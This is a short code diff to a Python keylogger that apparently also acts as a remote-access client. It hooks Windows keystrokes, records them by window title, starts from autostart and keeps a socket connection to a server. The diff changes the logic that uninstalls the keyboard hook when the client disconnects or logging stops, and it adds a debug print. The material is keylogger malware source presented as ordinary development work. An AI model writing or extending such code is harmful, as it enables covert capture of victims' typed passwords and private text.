@@ -145,15 +145,12 @@ class Key(threading.Thread):
                 else:
                     hooked[GetWindowTitle()] = self.updateKey(ord(chr(lParam[0]).lower()))
 
-        # check if client is alive
-        if not active:
-            self.keyLogger.uninstallHookProc()
-            return 'clientTerminated'
-
         # stop keylogging
         global loggingState
-        if not loggingState:
+        global active
+        if not loggingState or not active:
             self.keyLogger.uninstallHookProc()
+            print 'uninstalled'
         return self.user32.CallNextHookEx(self.keyLogger.hooked, nCode, wParam, lParam)
 
     def startKeyLog(self): #(8)
@@ -270,6 +267,7 @@ def fromAutostart():
             time.sleep(3)
         except socket.error:
             s.close()
+            active = False
             time.sleep(10)
             continue
 
